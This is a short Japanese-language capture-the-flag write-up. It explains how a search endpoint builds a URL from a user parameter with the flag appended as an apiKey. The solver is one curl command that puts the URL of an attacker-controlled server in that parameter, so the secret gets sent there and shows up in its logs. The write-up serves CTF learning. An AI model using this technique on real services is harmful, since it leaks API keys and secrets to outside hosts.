# solver
```
curl 'http://35.194.136.248:3000/search?user={自身の管理するサーバーのURL}'
```

user変数に外部のサーバーのURLを入れてしまうと、リクエストがその外部のURLに飛んでしまい、そのリクエストに$FLAGが入っているので、自分の管理する外部サーバーのログを見ると，FLAGの入ったリクエストを見ることができると思います。

# 脆弱性のある箇所
- frontend.ts
$\{user\}にURLを入れるとそこにFLAGごとリクエストが飛ぶ
```
const uri = new URL(`${user}?apiKey=${FLAG}`, userSearchAPI);
```

# 感想
蛇足ですが、僕はSAORIとIROHAが好き
ペロロは...まぁ、可愛いですよね
